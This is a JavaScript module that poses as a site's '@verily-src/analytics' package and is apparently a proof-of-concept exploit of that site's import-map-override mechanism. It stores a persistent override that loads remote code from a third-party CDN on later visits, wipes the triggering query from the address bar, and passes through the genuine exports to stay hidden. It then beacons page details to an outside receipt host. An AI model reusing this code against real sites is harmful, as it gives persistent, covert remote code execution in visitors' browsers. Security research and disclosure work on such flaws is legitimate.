System.register([], function (_export) {
  "use strict";

  const marker = "cedar-wave-7c31";
  const targetOrigin = "https://exchange.pre.verily.com";
  const moduleName = "@verily-src/analytics";
  const genuineModule =
    "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";
  const persistentSource =
    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@e270bcd032add5a371b703e31035f90b144e4624/cedar-wave-7c31-runtime.js";
  const receiptEndpoint =
    "https://img.defyourtype.com/x/cedar-wave-7c31-receipt.txt";

  let originalHadImo = false;

  const showInstall = () => {
    if (location.origin !== targetOrigin || window.__cedarWaveInstallerProof) {
      return;
    }

    const storageKey = `import-map-override:${moduleName}`;
    const catalogItems = document.querySelectorAll(
      '[data-testid="featured-card"], [data-testid="listing-card"], [data-testid="listing-row"]',
    ).length;
    const result = {
      marker,
      stage: "installer",
      origin: location.origin,
      originalHadImo,
      currentUrl: location.href,
      urlScrubbed: originalHadImo && location.search === "",
      installed: localStorage.getItem(storageKey) === persistentSource,
      persistentSource,
      genuineExportsForwarded: true,
      catalogItems,
    };
    window.__cedarWaveInstallerProof = result;

    const panel = document.createElement("pre");
    panel.id = `${marker}-installer`;
    panel.textContent = [
      "PERSISTENT MODULE INSTALLED",
      `Malicious query removed from address bar: ${result.urlScrubbed}`,
      `Current URL: ${result.currentUrl}`,
      `Persistent module stored: ${result.installed}`,
      `Genuine analytics exports forwarded: ${result.genuineExportsForwarded}`,
      `Catalog items still rendered: ${result.catalogItems}`,
      "A later clean visit will fetch the current remote instruction.",
    ].join("\n");
    Object.assign(panel.style, {
      position: "fixed",
      right: "14px",
      bottom: "14px",
      zIndex: "2147483647",
      maxWidth: "620px",
      margin: "0",
      padding: "17px",
      border: "3px solid #f59e0b",
      borderRadius: "10px",
      background: "#451a03",
      color: "#fffbeb",
      whiteSpace: "pre-wrap",
      font: "700 14px/1.5 Arial,sans-serif",
      boxShadow: "0 12px 34px rgba(0,0,0,.34)",
    });
    document.body.appendChild(panel);

    const query = new URLSearchParams({
      marker,
      stage: result.stage,
      origin: result.origin,
      originalHadImo: String(result.originalHadImo),
      urlScrubbed: String(result.urlScrubbed),
      installed: String(result.installed),
      genuineExportsForwarded: String(result.genuineExportsForwarded),
      catalogItems: String(result.catalogItems),
    });
    fetch(`${receiptEndpoint}?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  return {
    execute: async function () {
      if (location.origin === targetOrigin) {
        originalHadImo = new URL(location.href).searchParams.has("imo");
        window.importMapOverrides.addOverride(moduleName, persistentSource);
        if (originalHadImo) {
          history.replaceState(history.state, "", "/");
        }
      }

      const genuine = await System.import(genuineModule);
      _export("analytics", genuine.analytics);
      _export("default", genuine.default);
      _export("getApiKey", genuine.getApiKey);
      _export("__esModule", true);

      if (location.origin === targetOrigin) {
        window.setTimeout(showInstall, 8000);
      }
    },
  };
});
